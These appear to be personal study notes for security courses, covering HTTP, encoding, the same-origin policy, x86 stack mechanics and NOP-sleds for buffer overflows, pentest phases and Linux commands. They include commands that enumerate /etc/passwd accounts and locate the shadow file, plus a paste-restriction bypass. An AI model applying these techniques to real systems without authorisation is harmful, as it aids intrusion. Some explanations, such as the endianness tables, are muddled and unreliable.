      \n(Line Feed): moves the cursor down to the next line
      \r\n: Is the same of hitting enter on your keyboard


    Note that a connection to www.google.com on port 80 is initiated before sending HTTP commands to the webserver
    HTTP Request:
      HTTP/1.1 ==> This is the HTTP protocol version that your browser wants to talk with. This basically informs the web server about which version of HTTP you would like to use in any further communication
      Host ==> It allows a web server to host multiple websites at a single IP address.
      Host value ==> Host value + Path combine to create the full URL you are requesting: the home page of www.google.com/
      User-Agent ==> Reveals your browser version, operating system and language to the remote web server
      Accept ==> Used by your browser to specify which document type is expected to be returned as a result of this request
      Accept-Encoding ==> Similar to accept, but it restricts the content codings that are acceptable in the response. Content codings are primarily used to allow a document to be compressed or transformed without losing the identity of its media type and without loss of information
      Connection ==> With HTTP 1.1 you can keep your connection to the remote web server open for an unspecified amount of time using the value "keep-alive". This indicates that all requests to the web server will continue to be sent through this connection without initiating a new connection every time (as in HTTP 1.0)

    HTTP response
      Date: Represents the date and time at which the message was originated
      Cache-Control: Allows the browser and the server to agree about caching rules. Cached contents save bandwidth because, in short, they prevent your browser from re-requesting contents that have not changed when the same resource is to be used.
      Content-Type: Lets the client know how to interpret the body of the message
      Content-Encoding: "gzip" Extends Content-Type. In this case the message body is compressed with gzip
      Server: "gws". Displays the web server banner. Apache and IIS are common web servers. Google uses this custom webserver banner (Google Web Server)
      Content-Length: Indicates the length, in bytes, of the message body
      
  Encoding
    Internet users, via their web browsers, request billions of pages every day. All of the content of these pages are displayed according to a charset. But what is a character set? It contains a set of characters: they represent the set of all symbols(What the user reads as he sees it on the screen) and code points(Numeric index, used to distinguish, unambiguosly, the symbol within the charset) that the end user can display in their browser window. //A symbol can be shown only if it exists in the charset. Examples of charsets are: ASCII(https://www.ascii-code.com/), Unicode(https://unicode-table.com/en/#0032)/UTF-8, UTF-16 and UTF-32(The numbers are the amount of bits used to represent code points), Latin-1 and so on

    HTML4 ==> <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"> //ISO-8859-1: "8-bit single-byte coded graphic character sets" aka Latin 1
    HTML5 ==> <meta charset="UTF-8">
    
    If you want to show symbols (like < > ) in your web document and you want to avoid the symbols being interpreted by your browser as HTML language elements, then you need to use the related entities(It is not a really security feature however, its use can limit most client side attacks. An HTML entity is simply a string (starting with & or &# and ending with ;) that corresponds with a symbol. When the browser encounters an entity in an HTML page it will show the symbol to the user and will not ever interpret the symbol as an HTML language element
    Character Reference       Rule                                            Encoded character
    Named entity              & + named character references + ;              &lt; 
    Numeric Decimal           & + # + D + ;                                   &#60;
                                D = a decimal number
    Numeric Hexadecimal       & + #x + H + ;                                  &#x3c;
                                H = an hexadecimal number (case-insensitive)  &#X3C;

    URL encoding(percent encoding)
      URLs sent over the Internet must contain characters in the range of the US-ASCII code character set. If unsafe characters are present in a URL, encoding theme is required. 
      This encoding is important because it limits the characters to be used in a URL to a subset of specific characters:
        1. Unreserver chars: [a-zA-Z] [0-9] [-._~]
        2. Reserved chars (they have a specific purpose): :/?#[]@!$&"()*+,;=%·
      Other characters are encoded by the use of a percent char (%) plus two hexadecimal digits. Reserved chars must be encoded when they have no special role inside the URL. A list of common encoded characters(https://www.w3schools.com/tags/ref_urlencode.asp)
        Character   Purpose in URI          Encoding
        #           Separate anchors        %23
        ?           Separate query string   %3F
        &           Separate query elements %26
        +           Indicates a space       %2B

    Base64 
      Is a binary-to-text encoding schema used to convert binary files and send them over Internet. For example, the e-mail protocol makes massive use of this encoding to attach files to messages. The HTML language permits the inclusion of some resources by using this encoding. For example, an image can be included in a page by inserting its binary content that has been converted to base64
      The alphabet of the Base64 encoding scheme is composed of:
        digits ==> [0-9]
        latin letters ==> [a-zA-Z] 
        + and /

  Same Origin Policy(SOP)
    This policy prevents a script or a document from getting or setting properties of another document that comes from a different origin. The primary purpose of SOP is to isolate requests coming from different origins.
    The main rule of SOP is:
      "A document(HTML page, an iframe included in the main page or a response to an Ajax request) can access (through JavaScript) the properties of another document only if they have the same origin" //More precisely, the browser always performs the request successfully but it returns the response to the user only if the SOP is respected.
    CSS stylesheets(*.css), images and scripts(*.js) are loaded by the browser without consulting the policy. SOP is consulted when cross-site HTTP requests are inititated from within client side scripts (IE: JavaScript), or when an Ajax request is run.
    The origin is defined by the following triplet:
      Protocol + Host + Port ==> http://www.elswapt.site
    Other example ==> http://els.wapt.site/index.php
      SOP OK ==> http://els.wapt.site/admin/index.php ==> Same protocol, host and port
      SOP not OK ==>  https://els.wapt.site/index.php ==> Different protocol
    Content from ... inherits the origin
      about:blank
      javascript:
      data: 
    !Internet explorer works a bit differently from other browsers. It has two exceptions:
      · Port: It does not consider the port as a Same Origin component
      · Trust zone: The same Origin is not applied to domains that are in highly trusted zone (i.e. corporate domains)
    What would it happen if SOP did not exist?

      Suppose you are logged in to your bank site and suppose your friend invites you to visit his new website. Your evil friend could build a crafted page, instigate you to visit it and once visited by you, access(some) personal information from your bank account
    Example 
      Let us suppose that index.html on domain a.elswapt.site (referred to as origin1: http://a.elswapt.site) wants to access via an Ajax request(hxr) the home.html page on domain b.elswapt.site (referred to as origin2: http://b.elswapt.site). 
      The document index.html on domain a.elswapt.site cannot access via an Ajax request (xhr) the home.html page on domain b.elswapt.site
    
    Exceptions
    	window.location: A document can always write the location property of another document. The window.Location object can be used to get the current page address (URL) and to redirect the browser to a new page
	document.domain
	Cross window messaging 
	Cross origin resource sharing (CORS)
	
	


   	







    
How to pase into web page fields that prevent copy and paste?
document.getElementById("paste-no").onpaste={};
document.getElementById("paste-no").onpaste=null;


Waiting for some web programming knowledge

-=-=-=-=-=-

eCPPTv2
Architecture fundamentals
CPU, ISA and Assembly
 	> CPU (Central Process Unit): Is the device in charge of executing the machine code of a program
 	> Machine code (= machine language): Set of instructions that the CPU processes. Each instruction is a primitive command that executes a specific operation such as move data, changes the execution flow of the program, perform arithmetic or logic operations and others. CPU instructions are represented in hexadecimal. Therefore, the same machine code gets translated into mnemonic code (a more readable language); this is called the assembly language (ASM). The assembler we are going to use is NASM
 	> Each CPU has its own instruction set architecture (ISA) that a programmer (or a compiler) must understand and use to write a program correctly for that specific CPU and machine. One of the most common ISA is the x86 instruction set from the Intel 8086. The x86 acronym identifies 32-bit processors, while x64(aka x86_64 or AMD64) identifies the 64-bit versions. 

Registers
	> The number of bits, 32 or 64, refers to the width of the CPU registers. Each CPU has its fixed set of registers that are accessed when required. You can think of registers as temporary variables used by the CPU to get and store data.
	> Although almost all registers are small portions of memory in the CPU and serve to store data temporarily, it is important to know that some of them have specific functions, while some others are used for general data storage. We will focus on a specific group of registers: The General Purpose Registers (GPRs)
	> 8 general purpose registers to the x86 architecture
	EAX => Accumulator 	==> Used in arithmetic operation
	ECX => Counter 		==> Used in shift/rotate instruction and loops
	EDX => Data 		==> Used in arithmetic operation and I/0
	EBX => Base		==> Used as a pointer to data
	ESP => Stack Pointer	==> Pointer to the top of the stack
	EBP => Base Pointer 	==> Pointer to the base of the stack (aka Stack Base Pointer or Frame pointer)
	ESI => Source Index	==> Used as a pointer to a source in stream operation
	EDI => Destination 	==> Used as a pointer to a destination in stream operation
	> The naming convention of the old 8-bit CPU had 16-bit register divided into two parts:
		- A low byte, identified by an L at the end of the name 
		- A high byte, identified by an H a the end of the name
		For example: AH|AL, CH|CL, DH|DL, BH|BL, SPL, BPL, SIL and DIL
	> The 16-bit naming convention combines the L and the H and replaces it with an X. While for Stack Pointer, Base Pointer, Source and Destination registers it simply removes the L
		For example: AX, CX, DX, BX, SP, BP, SI and DI
	> In the 32-bit representation, the register acronym is prefixed with an E, meaning extended
	> In the 64-bit representation, the E is replaced with the R
	> Another important register , the EIP (x86 naming convention). It controls the program execution by storing a pointer to the address of the next instruction (machine code) that will be executed. It tells the CPU where the next instruction is.

Process Memory
The process is divided into four regions: Text, Data, the Heap and the Stack
	> The Text region, or instruction segment, is fixed by the program and contains the program code (instructions). This region is marked as read-only since the program should not change during execution
	> The Data region is divided into initialized data and uninitialized data. Initialized data includes items such as static and global declared variables that are pre-defined and can be modified. 
		+ The unintialized data, named Block Started by Symbol(BSS) also initializes variables thata are initialized to zero or do not have explicit initialization(ex. static int t)
	> Next is the Heap, which starts right after the BSS segment. During the execution, the program can request more space in memory via 'brk' and 'sbrk' system calls, used by 'malloc', 'realloc' and 'free'. Hence, the size of the data region can be extended.
	> The last region of the memory is the Stack.

The Stack
· The Stack is a Last-in-First-out (LIFO) block of memory. It is located in the higher part of the memory. You can think of the stack as an array used for saving a function's return addresses, passing function arguments and storing variables. The purpose of the ESP register(Stack Pointer) is to identify the top of the stack and it is modified each time a value is pushed in (PUSH) or popped out (POP)
· The stack grows downwards, towards the lower memory addresses
· The Heap would start from lower addresses and grow upwards and the Stack would start from the end of the memory and grow downward.
· The first example of how the stack changes is the execution of the following instruction: PUSH E
· The second example is the execution of the following instruction: POP E
	PUSH Instruction
	· A PUSH instruction subtracts 4(in 32-bit) or 8(in 64-bit) from the ESP and writes the data to the memory address in the ESP and then updates the ESP to the top of the stack. Remember that the Stack grows backward. Therefore the PUSH subtracts 4 or 8 in order to point to a lower memory location on the stack. If we do not subtract it, the PUSH operation will overwrite the current location pointed by ESP (the top) and we would lose data.
	> The ESP points to the top of the stack -4
		ESP	A	==> PUSH (E) ==>	E 	ESP-4
			B				A
			C				B
			D				C
							D
	> A more detailed example of the PUSH instruction
 		+ Starting value (ESP contains the address value): ESP points to the following memory address: 0x0028FF80
		+ Process: The program executes the instruction PUSH 1. ESP decreases by 4, becoming 0x0028FF7C and the value 1 will be pushed on the stack
				      ...	==> PUSH 1 ==>	ESP = 0x0028FF7C ==> 00000001
		ESP = 0x0028FF80 => ..data..					     ..data..
				    ..data..					     ..data..
				    ..data..					     ..data..
	POP Instruction
	 POP PROCESS
	 · A POP is executed and the ESP register is modified
	 STARTING VALUE
	 · The ESP points to the top of the stack (Previous ESP +4)
	 PROCESS
	 · The POP operation is the opposite of PUSH and it retrieves data from the top of the Stack. Therefore, the data contained at the address location in ESP (the top of the stack) is retrieved and stored (usually in another register). After a POP operation, the ESP value is incremented in x86 by 4 or in x64 by 8.
	ENDING VALUE
 	> The ESP points to the top of the stack +4. (Same as the previous location before the PUSH)
 		ESP	E	==> POP (E) ==>		A 	ESP+4
 			A				B
 			B				C
 			C				D
 			D       			

	> A more detailed example of the POP instruction
 		+ Starting value (ESP contains the address value): After the PUSH 1 the ESP points to the following memory address: 0x0028FF7C
		+ Process: The program executes the instruction POP EAX. The value (00000001) contained at the address of the ESP (0x0028FF7C = the top of the Stack) will be popped out from the stack and will be copied in the EAX register. Then, ESP is updated by adding 4 and becoming 0x0028FF80.

										     00000001
		ESP = 0x0028FF7C => 00000001	==> POP EAX ==>	ESP = 0x0028FF80 ==> ..data.. 
		 	            ..data..					     ..data..
				    ..data..					     ..data..
				    ..data..
	Procedures and functions
	 > It is important to understand thtat the value popped from the stack is not deleted (or zeroed). It will stay in the stack until another instruction overwrites it.

· Now that we know more about the Stack, we will investigate how procedures and functions work. It is important to know that procedures and functions alter the normal flow of the process. When a procedure or a function terminates, it returns control to the statement or instruction that called the function.	

· Stack Frames
 > Functions contain two important components
  - Prologue: Prepares the stack to be used 
  - Epilogue: When the function has completed, the epilogue resets the stack to the prologue settings.
 > The Stack consists of logical stack frames (portions/areas of the Stack) that are PUSHed when calling a functions and POPped when returning a value.
 > When a subroutine, such as a function or procedure, is started, a stack frame is created and assigned to the current ESP location (top of the stack); this allows the subroutine to operate independently in its own location in the stack.
 > When the subroutine ends, 2 things happen:
  1. The program receives the parameters passed from the subroutine.
  2. The Instruction Pointer (EIP) is reset to the location at the time of the initial call.
  * In other words, the stack frame keeps track of the location where each subroutine should return the control when it terminates.
 > This process has tree main operations:
  1. When a function is called, the arguments [(in brackets)] need to be evaluated
  2. The control flow jumps to the body of the function and the program executes its code
  3. Once the function ends, a return statement is encountered, the program returns to the function call (the next statement in the code).
  # Example in C
  int b(){ //function b
          return 0;
  }
  int a(){ //function a
          b();
          return 0;
  }
  int main(){ //main function
          a();
          return 0;
  }
  ## Explanation
  #Higher memory address(To upwards)Lower memory address.
  · Step 1:
  	+ The entry point of the program is main()
	+ The first stack frame that needs to be pushed to the Stack is the main() stack frame. Once initialized, the stack pointer is set to the top of the stack and a new main() stack frame is created.
  · Step 2:
  	+ Once inside main(), the first instruction that executes is a call to the function named a(). Once again, the stack pointer is set to the top of the stack of main() and a new stack frame for a () is created on the stack.
  · Step 3:
  	+ Once the function a() starts, the first instruction is a call to the function named b(). Here again, the stack pointer is set and a new stack frame for b() will be pushed on the top of the stack.
  · Step 4:
  	+ The function b() does nothing and just returns. When the function completes, the stack pointer is moved to its previous location and the program returns to the stack frame of a() and continues with the next instruction.
  · Step 5:
  	+ The next instruction executed is the return statement contained in a(). The a() stack frame is popped, the stack pointer is reset and we will get back in the main() stack frame.
  ## Another example related with Buffer Overflow.
  void functest(int a, int b, int c)  {
          int test1 = 55;
          int test2 = 56;
  }
  int main(int argc, char * argv[]) {
          int x = 11;
          int z = 12;
          int y = 13;
          functest(30,31,32);
          return 0;
  }
  ##Explanation
  · Step 1:
  	+ When the program starts, the function main() parameters (argc, argv) will be pushed on the stack from right to left. 
		argc
		argv
		...
  · Step 2:	
	+ CALL the function main(). Then, the processor PUSHes the content of the EIP(Instruction Pointer) to the stack and points to the first byte after the CALL instruction.
	+ This process is important because we need to know the address of the next instruction in order to proceed when we return from the function called.
  · Step 3:
  	+ The caller (the instruction that executes the function calls - the OS in this case) loses its control and the calle (the function that is called - the main function) takes control.
		old EIP  //Return address from main(). The next instruction to execute once we return from main.
		argc
		argv
		...
  · Step 4:
  	+ Now that we are in the main() function, a new stack frame needs to be created. The stack frame is defined by the EBP (Base Pointer) and the ESP (Stack pointer). Because we don't want to lose the old stack frame information, we have to save the current EBP on the Stack. If we did not do tis, when we returned, we will not know that this information belonged to the previous stack frame, the function that called main(). Once its value is stored , the EBP is updated and it points to the top of the stack
		old EBP //Contains the base pointer of the caller. At this time, both EBP and ESP points at the 
		old EIP   |
		argc	  |	Old stack frame
		argv      |
		...       | 
 · Prologue
 	It is a sequence of instructions that take place at the beginning of a function. This will occur for all functions. Once the callee gets the control, it will execute the following instructions:
	1 push ebp
	2 mov ebp, esp
	3 sub esp, X // X is a number
	
	##Explanation
	The first instruction(push ebp) saves the old base pointer onto the stack,so it can be restored later on when the function returns.
	EBP is currently pointing to the location of the top of the previous stack frame.
	----
	The second instruction (mov ebp, esp) copies the value of the Stack pointer (ESP - top of the stack) into the base pointer (EBP); this creates a new stack frame on top of the Stack.
	 + The base of the new stack frame is on top of the old stack frame
	 + Important: Notice that in assembly, the second operand of the instruction (esp in this case) is the source, while the first operand (ebp in this case) is the destination. Hence, esp is moved into ebp.
		
	The last instruction (sub esp, X) moves the Stack Pointer (top of the stack) by decreasing its value, this is necessary to make space for the local variables.
	 + Similar to the previous instruction, X is the source and esp is the destination. Therefore, the instruction subtracts X from esp (this X is not the int variable X from the program)
	 + The third instruction creates enough space in the stack to copy local variables. Variables are allocated by decreasing the stack pointer (top of the stack) by the amount of space required.
	 + Remember that the stack grows backward. Therefore, we have to decrease its value to expand the stack frame
	
	 + This represents the Stack once the prologue has happened.
	   Lower memory address					     <= [ESP-X]
	   	To			...
	   	[Upward]		EBP-8
	   	From			EBP-4	
	   Higher memory address	EBP+0	old EBP (caller EBP) <= EBP
	   				EBP+4	old EIP
	   				EBP+8	argc	
	   				...	argv
	   					...
	 	=> Notice that since the main function contains other variables and a function call, the actual stack frame for the main() subroutine is slightly bigger.
	 + Once the prologue ends, the stack frame for main() is complete and the local variables are copied to the stack. Since ESP is not pointing to the memory address right after EBP, we cannot use the PUSH operation, since PUSH stores the value on top of the stack (the addresss pointed by ESP).
	 + The variable is a hexadecimal value that is an offset from the base pointer (EBP) or the stack pointer (ESP)
	 + The instructions after the prologue are like the following:
	 	MOV DWORD PTR SS:[ESP+Y],0B
		> This instruction means: move the value 0B (hexadecimal of 11 - the first local variable) into the memory address location pointed at ESP+Y. Note that Y is a number and ESP+Y points to a memory address between EBP and ESP.
	 + This process will repeat through all the variables and once the process completes, the stack will look like the following

	   Lower memory address					     <= ESP
	   	To			...	13 (y)
	   	[Upward]		EBP-8	12 (z)
	   	From			EBP-4	11 (x)		     <= [ESP+Y]
	   Higher memory address	EBP+0	old EBP (caller EBP) <= EBP
	   				EBP+4	old EIP
	   				EBP+8	argc	
	   				...	argv
	   					...
	 + Then the main() continues executing its instructions.

  · Step 5
  	+ The next instruction calls the function functest().
	+ The whole process will be executed again. This time a new stack frame will be created for the function functest().
	The process looks like the following:
		> PUSH the function parameters in the stack
		> Call the function functest()
		> Execute the prologue (which will update EBP and ESP to create the new stack frame)
		> Allocate local variables onto the stack.
	+ The following is how the stack looks like at the end of the entire process.
		Functest Stack Frame	56		<- ESP
					55
					Old EBP (main)  <- EBP
		Main Stack Frame	old EIP
					30
					31
					32
					...
					13(y)
					12(z)
					11(x)
					old EBP
		OS Stack Frame		old EIP
					argc 
					argv
					...

1.2.4.6 Epilogue
 + We have seen how the stack frames are created. Now, we have to understand how they are destroyed. What happens when the code executes a return statement and the control goes back to the previous procedure (and stack frame)?
 + When the program enters a function, the prologue is executed to create the new stack frame
 + When the program executes a return statement, the previous stack frame is restored thanks to the epilogue.
 + The operations executed by the epilogue are the following:
 	 · Return the control to the caller
	 · Replace the stack pointer with the current base pointer. It restores its value to before the prologue; this is done by POPping the base pointer from the stack.
	 · Returns to the caller by POPping the instruction pointer from the stack (stored in the stack) and then it jumps to it.
 + The following code represents the epilogue:
 	leave 
	ret
 + The instructions can also be written as follows:
 	mov esp, ebp
	pop ebp
	ret
 + This is what happens to the previous stack when the function functest() ends. Notice that even if the code does not contain a return, when the program leaves a subroutine it will still run the epilogue.
					...
		Main Stack Frame ESP ->	Old EBP (main)  <- EBP
					old EIP
					30
					31
					32
					...
					13(y)
					12(z)
					11(x)
					old EBP
		OS Stack Frame		old EIP
					argc 
					argv
					...
 + The first instruction in the epilogue is mov esp, ebp. After it gets executed; both ESP and EBP point to the same location.
 + The next instruction is pop ebp, which simply POPS the value from the top of the stack into EBP. Since the top of the Stack points to the memory address location where the old EBP is stored (the EBP of the caller), the caller stack frame is restored.
 + It is important to know that a POP operation automatically updates the ESP (same as the PUSH).
 + Therefore, ESP now points to the old EIP previously stored
					...
					Old EBP (main)  
		Main Stack Frame	old EIP		<- ESP
					30
					31
					32
					...
					13(y)
					12(z)
					11(x)
					old EBP 	<- EBP
		OS Stack Frame		old EIP
					argc 
					argv
					...
 + The last instruction that the epilogue will execute is ret. RET pops the value contained at the top of the stack to the old EIP - the next instruction after the caller and jumps to that location. This gives control back to the caller. RET affects only the EIP and the ESP registers.

1.2.5 Endianness
 + Endianness is the way of representing (storing) values in memory.
 + Even though there are three types of endianness, we will explain only two of them, the most important ones: big-endian and little-endian.
 > First, it is important to know these two concepts:
 	· The most significant bit (MSB) in a binary number is the largest value, usually the first from the left. So, for example, considering the binary number 100 the MSB is 1.
	· The least significant bit (LSB) in a binary number is the lowest value, usually the first from the right. So, for example, considering the binary number 110 the LSB is 0.
 + In the big-endian representation, the least significant byte (LSB) is stored at the highest memory address. While the most significant byte (MSB) is at the lowest memory address.
 	· Example: the 0x12345678 value is represented as:
		Highest memory	Address in memory	Byte value
				+0			0x12
				+1			0x34
				+2			0x56
		Lowest memory	+3			0x78
 + Respectively, in the little-endian representation, the least significant byte (LSB) is stored at the lower memory address, while the most significant byte is at the highest memory address. 
 	· Example: the 0x12345678 is represented in memory as:
		Highest memory	Address in memory	Byte value
				+0			0x78
				+1			0x56
				+2			0x34
		Lowest memory	+3			0x12
 + Here's another example. Let us consider the value 11 (0B in hexadecimal). The example system is using little-endian representation; therefore, the LSB is stored in the lower memory address or MSB is stored at the highest memory address.
 + Using the previous table, we will have the following
		Highest memory	Address in memory	Byte value
				+0			0x0B
				+1			0x00
				+2			0x00
		Lowest memory	+3			0x00
 + Remember that the most significant byte is stored at the highest memory address and since the stack grows backward (towards lower addresses), the most significant byte (0B in this case) will be stored on the "left" (0028FEBF - the highest memory address)

1.2.6 NOPs
+ Another important topic is the No Operation instruction (NOP)
+ NOP is an assembly language instruction that does nothing. When the program encounters a NOP, it will simply skip to the next instruction. In Intel x86 CPUs, NOP instructions are represented with the hexadecimal value 0x90
+ NOP-sled is a technique used during the exploitation process of Buffer Overflows. Its only purpose is to fill a large (or small) portion of the stack with NOPs; this will allow us to slide down to the instruction we want to execute, which is usually put after the NOP-sled.
+ The reason is because Buffer Overflows have to match a specific size and location that the program is expecting.



Continue...
-=-=-=
Meanwhile (HTB academy fundamentals modules)
Penetration testing phases (Introduction)
1. Pre-Engagement
	Types of Testing environments
		Network 	Web App 	Mobile 	API 	Thick Clients
		IoT 	Cloud 	Source Code 	Physical Security 	Employees
		Hosts 	Server 	Security Policies 	Firewalls 	IDS/IPS
	
	Document							Timing for Creation
	1. Non-Disclosure Agreement (NDA)				After Initial Contact
	2. Scoping Questionnaire					Before the Pre-Engagement Meeting
	3. Scoping Document						During the Pre-Engagement Meeting
	4. Penetration Testing Proposal (Contract/Scope of Work (SoW))	During the Pre-engagement Meeting
	5. Rules of Engagement (RoE)					Before the Kick-Off Meeting
	6. Contractors Agreement (Physical Assessments)			Before the Kick-Off Meeting
	7. Reports							During and after the conducted Penetration Test
	
	
	Aside from the assessment type, client name, address, and key personnel contact information, some other critical pieces of information include:
		
	How many expected live hosts? 	
	How many IPs/CIDR ranges in scope? 	
	How many Domains/Subdomains are in scope? 	
	How many wireless SSIDs in scope? 	
	How many web/mobile applications? If testing is authenticated, how many roles (standard user, admin, etc.)? 	
	For a phishing assessment, how many users will be targeted? Will the client provide a list, or we will be required to gather this list via OSINT? 	
	If the client is requesting a Physical Assessment, how many locations? If multiple sites are in-scope, are they geographically dispersed? 	
	What is the objective of the Red Team Assessment? Are any activities (such as phishing or physical security attacks) out of scope? 	
	Is a separate Active Directory Security Assessment desired? 	
	Will network testing be conducted from an anonymous user on the network or a standard domain user? 	
	Do we need to bypass Network Access Control (NAC)?

2. Information gathering
2.1 Categories	
    Open-Source Intelligence
    Infrastructure Enumeration: This includes name servers, mail servers, web servers, cloud instances, and more. We make an accurate list of hosts and their IP addresses and compare them to our scope to see if they are included and listed.
    Service Enumeration
    Host Enumeration
2.2 Interesting websites 
	https://searchcode.com/

3. Vulnerability assessment
3.1. Different sources
	https://www.cvedetails.com/
	https://packetstormsecurity.com/
	https://www.exploit-db.com/
	https://nvd.nist.gov/vuln/search?execution=e2s1
	https://www.securityfocus.com/vulnerabilities
	https://vulners.com/
	https://www.rapid7.com/db/
	https://www.vulnerability-lab.com/

4. Exploitation
	https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator
5. Post-Exploitation
	Pillaging is the stage where we examine the role of the host in the corporate network. We analyze the network configurations, including but not limited to:
		Interfaces 	Routing 	DNS
		ARP 	Services 	VPN
		IP Subnets 	Shares 	Network Traffic

	Companies must adhere to data security regulations depending on the type of data involved. These include, but are not limited to:
		Type of Information 	Security Regulation
		Credit Card Account Information 	Payment Card Industry (PCI)
		Electronic Patient Health Information 	Health Insurance Portability and Accountability Act (HIPAA)
		Consumers Private Banking Information 	Gramm-Leach-Bliley (GLBA)
		Government Information 	Federal Information Security Management Act of 2002 (FISMA)
		
	Some frameworks companies may follow include:
			
		(NIST) - National Institute of Standards and Technology 	(CIS Controls) - Center for Internet Security Controls
		(ISO) - International Organization for Standardization 	(PCI-DSS) - The Payment Card Industry Data Security Standard
		(GDPR) - General Data Protection Regulation 	(COBIT) - Control Objectives for Information and Related Technologies
		(FedRAMP) - The Federal Risk and Authorization Management Program 	(ITAR) - International Traffic in Arms Regulations
		(AICPA) - American Institute of Certified Public Accountants 	(NERC CIP Standards) - NERC Critical Infrastructure Protection Standards
-=-=-=-




    

Academy_HTB
Linux fundamentals(https://www.pathname.com/fhs/pub/fhs-2.3.pdf)
| *Command* | *Description* |
| --------------|-------------------|
| `man <tool>` | Opens man pages for the specified tool. | 
| `<tool> -h` | Prints the help page of the tool. | 
| `apropos <keyword>` | Searches through man pages' descriptions for instances of a given keyword. | 
| `cat` | Concatenate and print files. |
| `whoami` | Displays current username. | 
| `id` | Returns users identity. | 
    The adm group means that the user can read log files in /var/log
| `hostname` | Sets or prints the name of the current host system. | 
| `uname` | Prints operating system name. | 
    uname -p //Processor type
    uname -i //Hardware plaftorm
| `pwd` | Returns working directory name. | 
| `ifconfig` | The `ifconfig` utility is used to assign or view an address to a network interface and/or configure network interface parameters. | 
| `ip` | Ip is a utility to show or manipulate routing, network devices, interfaces, and tunnels. | 
| `netstat` | Shows network status. | 
| `ss` | Another utility to investigate sockets. | 
  ss -l -4 | grep -E "LISTEN" | grep -vE "127.0.0.*" |wc -l
| `ps` | Shows process status. | 
| `who` | Displays who is logged in. | 
| `env` | Prints environment or sets and executes a command. | 
| `lsblk` | Lists block devices. | 
| `lsusb` | Lists USB devices. | 
| `lsof` | Lists opened files. | 
| `lspci` | Lists PCI devices. | 
| `sudo` | Execute command as a different user. | 
| `su` | The `su` utility requests appropriate user credentials via PAM and switches to that user ID (the default user is the superuser).  A shell is then executed. | 
| `useradd` | Creates a new user or update default new user information. | 
| `userdel` | Deletes a user account and related files. |
| `usermod` | Modifies a user account. | 
| `addgroup` | Adds a group to the system. | 
| `delgroup` | Removes a group from the system. | 
| `passwd` | Changes user password. |
| `dpkg` | Install, remove and configure Debian-based packages. | 
    dpkg -i strace_4.21-1ubuntu1_amd64.deb
    dpkg -i | grep -c "^ii" //List total packages installed on the target system
| `apt` | High-level package management command-line utility. | 
    A package is an archive file containing multiple ".deb" files.
    cat /etc/apt/sources.list
    APT uses a database called the APT cache. This is used to provide information about packages installed on our system offline.
        apt-cache search impacket
        apt-cache show impacket-scripts
        apt list --installed
| `aptitude` | Alternative to `apt`. | 
| `snap` | Install, remove and configure snap packages. |
| `gem` | Standard package manager for Ruby. | 
| `pip` | Standard package manager for Python. | 
| `git` | Revision control system command-line utility. | 
| `systemctl` | Command-line based service and systemd control manager. |
    Most Linux distributions have now switched to systemd. This daemon is an Init process started first and thus has the process ID (PID) 1. This daemon monitors and takes care of the orderly starting and stopping of other services. All processes have an assigned PID that can be viewed under /proc/ with the corresponding number. Such a process can have a parent process ID (PPID), known as the child process.
    Besides systemctl we can also use update-rc.d to manage SysV init script links. Let us have a look at some examples
        systemctl enable ssh
    systemctl list-units --type=service //list all services
| `ps` | Prints a snapshot of the current processes. | 
| `journalctl` | Query the systemd journal. | 
    journalctl -u ssh.service --no-pager //View logs 
| `kill` | 
    kill -l //
        The most commonly used are:
        Signal	Description
    1	SIGHUP - This is sent to a process when the terminal that controls it is closed.
    2	SIGINT - Sent when a user presses [Ctrl] + C in the controlling terminal to interrupt a process.
    3	SIGQUIT - Sent when a user presses [Ctrl] + D to quit.
    9	SIGKILL - Immediately kill a process with no clean-up operations.
    15	SIGTERM - Program termination.
    19	SIGSTOP - Stop the program. It cannot be handled anymore.
    20	SIGTSTP - Sent when a user presses [Ctrl] + Z to request for a service to suspend and they will not be executed further. To keep it running in the background, we have to enter the command bg to put the process in the background.

| `jobs` | Lists all processes that are running in the background. | 
| `fg` | Puts a process into the foreground. | 
| `bg` | Suspends the process but it keep it running in the background
| `curl` | Command-line utility to transfer data from or to a server. | 
| `wget` | An alternative to `curl` that downloads files from FTP or HTTP(s) server. |
| `python3 -m http.server` | Starts a Python3 web server on TCP port 8000. | 
| `ls` | Lists directory contents. | 
| `cd` | Changes the directory. |
| `clear` | Clears the terminal. | 
| `touch` | Creates an empty file. |
| `mkdir` | Creates a directory. | 
  mkidr -p Storage/local/user/documents //Add parent directories
| `tree` | Lists the contents of a directory recursively. |
| `mv` | Move or rename files or directories. | 
| `cp` | Copy files or directories. |
| `nano` | Terminal based text editor. | 
| `which` | Returns the path to a file or link. |
| `find` | Searches for files in a directory hierarchy. | 
  find / -type f -name *.conf -user root -size +20k -newermt 2020-03-03 -exec ls -al {} \; 2>/dev/null
  find / -type f -name *.conf -newermt 2020-03-03 -size +25k -size -28k -exec ls -al {} \; 2>/dev/null
  find /etc/ -name shadow 2> stderr.txt 1> stdout.txt //Redirect STDOUT and STDERR to separate files
| `updatedb` | Updates the locale database for existing contents on the system. |
| `locate` | Uses the locale database to find contents on the system. | 
| `more` | Pager that is used to read STDOUT or files. |
| `less` | An alternative to `more` with more features. Unlike more, when be closed the output does not remain in the terminal | 
| `head` | Prints the first ten lines of STDOUT or a file. |
| `tail` | Prints the last ten lines of STDOUT or a file. | 
| `sort` | Sorts the contents of STDOUT or a file. |
| `grep` | Searches for specific results that contain given patterns. | 
| `cut` | Removes sections from each line of files. |
| `tr` | Replaces certain characters. | 
| `column` | Command-line based utility that formats its input into multiple columns. |
  cat /etc/passwd | grep -Ev "nologin|false" | tr ":" " " | column -t
| `awk` | Pattern scanning and processing language. |
  cat /etc/passwd | grep -Ev "nologin|false" | tr ":" " "  | awk '{print $1, $NF}'
| `sed` | A stream editor for filtering and transforming text. | 
| `wc` | Prints newline, word, and byte counts for a given input. |
| `chmod` | Changes permission of a file or directory. |
| `chown` | Changes the owner and group of a file or directory. |
  chown root:root shell && ls -l shell

Path	Description
/	    The top-level directory is the root filesystem and contains all of the files required to boot the operating system before other filesystems are mounted as well as the files required to boot the other filesystems. After boot, all of the other filesystems are mounted at standard mount points as subdirectories of the root.
/bin	Contains essential command binaries.
/boot	Consists of the static bootloader, kernel executable, and files required to boot the Linux OS.
/dev	Contains device files to facilitate access to every hardware device attached to the system.
/etc	Local system configuration files. Configuration files for installed applications may be saved here as well.
/home	Each user on the system has a subdirectory here for storage.
/lib	Shared library files that are required for system boot.
/media	External removable media devices such as USB drives are mounted here.
/mnt	Temporary mount point for regular filesystems.
